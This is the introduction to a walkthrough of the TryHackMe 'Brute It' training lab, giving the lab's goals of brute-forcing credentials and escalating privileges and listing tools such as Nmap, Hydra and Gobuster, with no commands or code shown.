TryHackMe “Brute It” Lab Walkthrough
By Adhith

Introduction
Cybersecurity labs are one of the best ways to learn practical hacking skills. In this report, I will explain my walkthrough of the Brute It room on TryHackMe.

This lab focuses on:

Enumeration
Brute-force attacks
Gaining initial access
Privilege escalation
The goal of the room is to discover credentials using brute-force techniques and escalate privileges to gain full system access.

Lab Setup
Before starting the lab, I connected to the TryHackMe VPN and accessed the target machine provided in the room.

Tools used during the lab:

Nmap
Hydra
Gobuster
SSH
Linux privilege escalation techniques
